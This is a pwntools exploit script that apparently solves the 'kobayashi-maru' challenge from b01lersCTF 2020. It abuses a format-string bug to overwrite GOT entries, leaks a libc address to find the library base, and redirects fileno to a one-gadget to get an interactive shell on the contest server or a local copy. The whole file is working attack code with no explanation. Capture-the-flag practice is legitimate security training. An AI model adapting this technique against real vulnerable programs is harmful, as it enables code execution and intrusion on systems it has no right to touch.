#!/usr/bin/python
from pwn import *

chdir = '/MOUNT/contest/b01lersCTF-2020/kobayashi-maru/'
config = {
        'elf': chdir + 'kobayashi',
        'libc': chdir + 'libc.so.6',
        'HOST': 'pwn.ctf.b01lers.com',
        'PORT': 1006
        }
e = ELF(config["elf"])
libc = ELF(config["libc"])

def fsb(r, data):
    r.sendlineafter('Do you have any dying words?\n', data)
    pause()

def exploit(r):
    r.sendlineafter('Choice: ','2')
    r.sendlineafter("Type the member's name: ",'Nyota')
    r.sendlineafter('(Kirk)\n','1')
    r.sendlineafter("Type the member's name: ",'Scotty')
    r.sendlineafter('[4] Divert energy from guns into shields\n','1')
    r.sendlineafter('Who would you like to order third?\n','Janice')
    r.sendlineafter("[4] Fire off the guns which Janice hasn't been trained on yet\n",'1')
    r.sendlineafter('Who would you like to order last?\n','Leonard')

    fsb(r, p32(e.got['exit']) + '%{}c%6$n'.format(0x804aacd - 0x4))
    fsb(r, "%2$p")
    libc.address = int(r.recvn(10),16) - libc.symbols['_IO_2_1_stdin_']
    oneshot = libc.address + 0x6729f
    log.info('libc base: {:#x}'.format(libc.address))
    fsb(r, p32(e.got['fileno']) + '%{}c%6$hn'.format(oneshot%0x10000 - 0x4))
    r.interactive()

if __name__ == '__main__':

    if len(sys.argv) > 1:
        r = remote(config["HOST"], config["PORT"])
    else:
        context.log_level = 'debug'
        context.terminal=['tmux', 'splitw', '-h']
        r = process(config['elf'], env={'LD_PRELOAD':config['libc']})
        gdb.attach(r, gdbscript='''b*0x804ab52''')
    exploit(r)

